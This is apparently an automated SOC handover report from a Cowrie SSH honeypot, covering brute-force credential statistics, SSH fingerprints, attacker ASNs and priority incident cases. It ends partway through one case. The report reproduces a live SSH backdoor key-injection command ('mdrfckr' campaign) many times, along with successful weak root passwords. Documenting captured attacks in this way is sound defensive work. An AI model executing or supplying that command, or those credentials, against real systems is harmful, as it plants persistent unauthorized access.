# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-08 |
| **Generated At** | 2026-05-08T06:01:42Z |
| **Shift Time** | 06:01 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **206** |
| Confirmed Threats | **195** |
| False Positives Filtered | **11** (5.3%) |
| Unique Attacker IPs | **26** |
| Countries of Origin | **15** |
| High Severity Cases | **18** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **188** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **133** |
| Unique Credential Pairs | **83** |
| Unique Usernames | **38** |
| Unique Passwords | **77** |
| Successful Auth Pairs | **15** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 20 |
| `ubuntu` | 18 |
| `admin` | 15 |
| `test` | 13 |
| `345gs5662d34` | 9 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 9 |
| `3245gs5662d34` | 9 |
| `test` | 5 |
| `123123` | 4 |
| `ispadmin` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 9 |
| `root` | `3245gs5662d34` | 9 |
| `root` | `ispadmin` | 3 |
| `root` | `` | 2 |
| `test` | `asdfasdf` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `oracle!@#` | `139.59.112.10` | 2026-05-08T03:28:43 |
| `root` | `3245gs5662d34` | `139.59.112.10` | 2026-05-08T03:28:46 |
| `root` | `adminpwd` | `139.59.112.10` | 2026-05-08T03:29:43 |
| `root` | `server@2019` | `121.142.87.218` | 2026-05-08T03:43:03 |
| `root` | `3245gs5662d34` | `121.142.87.218` | 2026-05-08T03:43:06 |
| `root` | `admin$$$` | `139.59.112.10` | 2026-05-08T03:43:36 |
| `root` | `admin_123456` | `121.142.87.218` | 2026-05-08T03:46:04 |
| `root` | `ispadmin` | `221.139.88.149` | 2026-05-08T04:42:58 |
| `root` | `3245gs5662d34` | `221.139.88.149` | 2026-05-08T04:43:07 |
| `root` | `ispadmin` | `201.186.40.250` | 2026-05-08T04:51:51 |
| `root` | `3245gs5662d34` | `201.186.40.250` | 2026-05-08T04:51:59 |
| `root` | `root123456..` | `102.23.122.235` | 2026-05-08T05:02:35 |
| `root` | `3245gs5662d34` | `102.23.122.235` | 2026-05-08T05:02:41 |
| `root` | `ispadmin` | `222.255.214.79` | 2026-05-08T05:04:00 |
| `root` | `3245gs5662d34` | `222.255.214.79` | 2026-05-08T05:04:03 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **206** |
| Sessions with Fingerprint | **6** |
| Unique HASSH Fingerprints | **6** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 164 |
| Go SSH scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `af8223ac9914...` | libssh-based | 125 | 6 |
| `03a80b21afa8...` | Modern SSH client | 37 | 2 |
| `f1e5e9d24e5e...` | Mirai/variant | 1 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |
| `f555226df196...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `af8223ac9914...` | libssh | 125 | 6 | libssh-based |
| `03a80b21afa8...` | libssh | 37 | 2 | Modern SSH client |
| `f1e5e9d24e5e...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 1 | 1 | — |
| `f555226df196...` | libssh | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 9 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `102.23.122.235`, `201.186.40.250`, `221.139.88.149`, `121.142.87.218`, `139.59.112.10`, `222.255.214.79`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **26** |
| Unique ASNs | **25** |
| High-Risk ASNs | **15** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 2 | LOW |
| `AS38121` | LG HelloVision Corp. | 1 | LOW |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 1 | HIGH |
| `AS56019` | Beijing ShuJuJia Technology Co., Ltd. | 1 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 1 | HIGH |
| `AS680` | Verein zur Foerderung eines Deutschen Forschungsnetzes e.V. | 1 | HIGH |
| `AS49800` | GNC-Alfa CJSC | 1 | MEDIUM |
| `AS3352` | TELEFONICA DE ESPANA S.A.U. | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (18)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-84e9d6cf3dc8

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-08 03:28 |
| **Last Seen** | 2026-05-08 03:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 03:28:43` | `cowrie.session.connect` |
| `2026-05-08 03:28:43` | `cowrie.client.version` |
| `2026-05-08 03:28:43` | `cowrie.client.kex` |
| `2026-05-08 03:28:43` | `cowrie.login.success` |
| `2026-05-08 03:28:43` | `cowrie.session.params` |
| `2026-05-08 03:28:43` | `cowrie.command.input` |
| `2026-05-08 03:28:43` | `cowrie.command.failed` |
| `2026-05-08 03:28:43` | `cowrie.log.closed` |
| `2026-05-08 03:28:44` | `cowrie.session.params` |
| `2026-05-08 03:28:44` | `cowrie.command.input` |
| `2026-05-08 03:28:44` | `cowrie.session.file_download` |
| `2026-05-08 03:28:44` | `cowrie.log.closed` |
| `2026-05-08 03:28:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1248431f6a20

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-08 03:28 |
| **Last Seen** | 2026-05-08 03:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 03:28:45` | `cowrie.session.connect` |
| `2026-05-08 03:28:45` | `cowrie.client.version` |
| `2026-05-08 03:28:45` | `cowrie.client.kex` |
| `2026-05-08 03:28:46` | `cowrie.login.success` |
| `2026-05-08 03:28:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47cf8aeeb484

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-08 03:29 |
| **Last Seen** | 2026-05-08 03:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 03:29:42` | `cowrie.session.connect` |
| `2026-05-08 03:29:42` | `cowrie.client.version` |
| `2026-05-08 03:29:43` | `cowrie.client.kex` |
| `2026-05-08 03:29:43` | `cowrie.login.success` |
| `2026-05-08 03:29:43` | `cowrie.session.params` |
| `2026-05-08 03:29:43` | `cowrie.command.input` |
| `2026-05-08 03:29:43` | `cowrie.command.failed` |
| `2026-05-08 03:29:43` | `cowrie.log.closed` |
| `2026-05-08 03:29:43` | `cowrie.session.params` |
| `2026-05-08 03:29:43` | `cowrie.command.input` |
| `2026-05-08 03:29:43` | `cowrie.session.file_download` |
| `2026-05-08 03:29:43` | `cowrie.log.closed` |
| `2026-05-08 03:29:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6811ac32d03

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-08 03:29 |
| **Last Seen** | 2026-05-08 03:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 03:29:45` | `cowrie.session.connect` |
| `2026-05-08 03:29:45` | `cowrie.client.version` |
| `2026-05-08 03:29:45` | `cowrie.client.kex` |
| `2026-05-08 03:29:45` | `cowrie.login.success` |
| `2026-05-08 03:29:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73857d5f97ba

| Field | Detail |
|---|---|
| **Source IP** | `121.142.87[.]218` |
| **First Seen** | 2026-05-08 03:43 |
| **Last Seen** | 2026-05-08 03:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 03:43:02` | `cowrie.session.connect` |
| `2026-05-08 03:43:02` | `cowrie.client.version` |
| `2026-05-08 03:43:02` | `cowrie.client.kex` |
| `2026-05-08 03:43:03` | `cowrie.login.success` |
| `2026-05-08 03:43:03` | `cowrie.session.params` |
| `2026-05-08 03:43:03` | `cowrie.command.input` |
| `2026-05-08 03:43:03` | `cowrie.command.failed` |
| `2026-05-08 03:43:03` | `cowrie.log.closed` |
| `2026-05-08 03:43:03` | `cowrie.session.params` |
| `2026-05-08 03:43:03` | `cowrie.command.input` |
| `2026-05-08 03:43:04` | `cowrie.session.file_download` |
| `2026-05-08 03:43:04` | `cowrie.log.closed` |
| `2026-05-08 03:43:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.142.87[.]218` to AbuseIPDB if not already reported
- [ ] Block `121.142.87[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aeac0055f589

| Field | Detail |
|---|---|
| **Source IP** | `121.142.87[.]218` |
| **First Seen** | 2026-05-08 03:43 |
| **Last Seen** | 2026-05-08 03:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 03:43:06` | `cowrie.session.connect` |
| `2026-05-08 03:43:06` | `cowrie.client.version` |
| `2026-05-08 03:43:06` | `cowrie.client.kex` |
| `2026-05-08 03:43:06` | `cowrie.login.success` |
| `2026-05-08 03:43:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.142.87[.]218` to AbuseIPDB if not already reported
- [ ] Block `121.142.87[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01d9b18f78dc

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-08 03:43 |
| **Last Seen** | 2026-05-08 03:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 03:43:36` | `cowrie.session.connect` |
| `2026-05-08 03:43:36` | `cowrie.client.version` |
| `2026-05-08 03:43:36` | `cowrie.client.kex` |
| `2026-05-08 03:43:36` | `cowrie.login.success` |
| `2026-05-08 03:43:36` | `cowrie.session.params` |
| `2026-05-08 03:43:36` | `cowrie.command.input` |
| `2026-05-08 03:43:36` | `cowrie.command.failed` |
| `2026-05-08 03:43:36` | `cowrie.log.closed` |
| `2026-05-08 03:43:37` | `cowrie.session.params` |
| `2026-05-08 03:43:37` | `cowrie.command.input` |
| `2026-05-08 03:43:37` | `cowrie.session.file_download` |
| `2026-05-08 03:43:37` | `cowrie.log.closed` |
| `2026-05-08 03:43:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04770a291a81

| Field | Detail |
|---|---|
| **Source IP** | `139.59.112[.]10` |
| **First Seen** | 2026-05-08 03:43 |
| **Last Seen** | 2026-05-08 03:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 03:43:38` | `cowrie.session.connect` |
| `2026-05-08 03:43:38` | `cowrie.client.version` |
| `2026-05-08 03:43:38` | `cowrie.client.kex` |
| `2026-05-08 03:43:38` | `cowrie.login.success` |
| `2026-05-08 03:43:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.112[.]10` to AbuseIPDB if not already reported
- [ ] Block `139.59.112[.]10` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-243f98485afa

| Field | Detail |
|---|---|
| **Source IP** | `121.142.87[.]218` |
| **First Seen** | 2026-05-08 03:46 |
| **Last Seen** | 2026-05-08 03:46 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 03:46:03` | `cowrie.session.connect` |
| `2026-05-08 03:46:03` | `cowrie.client.version` |
| `2026-05-08 03:46:03` | `cowrie.client.kex` |
| `2026-05-08 03:46:04` | `cowrie.login.success` |
| `2026-05-08 03:46:04` | `cowrie.session.params` |
| `2026-05-08 03:46:04` | `cowrie.command.input` |
| `2026-05-08 03:46:04` | `cowrie.command.failed` |
| `2026-05-08 03:46:04` | `cowrie.log.closed` |
| `2026-05-08 03:46:04` | `cowrie.session.params` |
| `2026-05-08 03:46:04` | `cowrie.command.input` |
| `2026-05-08 03:46:04` | `cowrie.session.file_download` |
| `2026-05-08 03:46:04` | `cowrie.log.closed` |
| `2026-05-08 03:46:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.142.87[.]218` to AbuseIPDB if not already reported
- [ ] Block `121.142.87[.]218` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec46b4787587

| Field | Detail |
|---|---|
| **Source IP** | `121.142.87[.]218` |
| **First Seen** | 2026-05-08 03:46 |
| **Last Seen** | 2026-05-08 03:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 03:46:07` | `cowrie.session.connect` |
| `2026-05-08 03:46:07` | `cowrie.client.version` |
| `2026-05-08 03:46:07` | `cowrie.client.kex` |
| `2026-05-08 03:46:07` | `cowrie.login.success` |
| `2026-05-08 03:46:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.142.87[.]218` to AbuseIPDB if not already reported
- [ ] Block `121.142.87[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a798cd7a65aa

| Field | Detail |
|---|---|
| **Source IP** | `221.139.88[.]149` |
| **First Seen** | 2026-05-08 04:42 |
| **Last Seen** | 2026-05-08 04:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 04:42:57` | `cowrie.session.connect` |
| `2026-05-08 04:42:57` | `cowrie.client.version` |
| `2026-05-08 04:42:57` | `cowrie.client.kex` |
| `2026-05-08 04:42:58` | `cowrie.login.success` |
| `2026-05-08 04:42:58` | `cowrie.session.params` |
| `2026-05-08 04:42:58` | `cowrie.command.input` |
| `2026-05-08 04:42:58` | `cowrie.command.failed` |
| `2026-05-08 04:42:59` | `cowrie.log.closed` |
| `2026-05-08 04:42:59` | `cowrie.session.params` |
| `2026-05-08 04:42:59` | `cowrie.command.input` |
| `2026-05-08 04:42:59` | `cowrie.session.file_download` |
| `2026-05-08 04:42:59` | `cowrie.log.closed` |
| `2026-05-08 04:43:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.139.88[.]149` to AbuseIPDB if not already reported
- [ ] Block `221.139.88[.]149` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7aaa4cb37c67

| Field | Detail |
|---|---|
| **Source IP** | `221.139.88[.]149` |
| **First Seen** | 2026-05-08 04:43 |
| **Last Seen** | 2026-05-08 04:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 04:43:01` | `cowrie.session.connect` |
| `2026-05-08 04:43:01` | `cowrie.client.version` |
| `2026-05-08 04:43:02` | `cowrie.client.kex` |
| `2026-05-08 04:43:07` | `cowrie.login.success` |
| `2026-05-08 04:43:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `221.139.88[.]149` to AbuseIPDB if not already reported
- [ ] Block `221.139.88[.]149` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90cd3c1ca9d0

| Field | Detail |
|---|---|
| **Source IP** | `201.186.40[.]250` |
| **First Seen** | 2026-05-08 04:51 |
| **Last Seen** | 2026-05-08 04:51 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-08 04:51:49` | `cowrie.session.connect` |
| `2026-05-08 04:51:49` | `cowrie.client.version` |
| `2026-05-08 04:51:49` | `cowrie.client.kex` |
| `2026-05-08 04:51:51` | `cowrie.login.success` |
| `2026-05-08 04:51:52` | `cowrie.session.params` |
| `2026-05-08 04:51:52` | `cowrie.command.input` |
| `2026-05-08 04:51:52` | `cowrie.command.failed` |
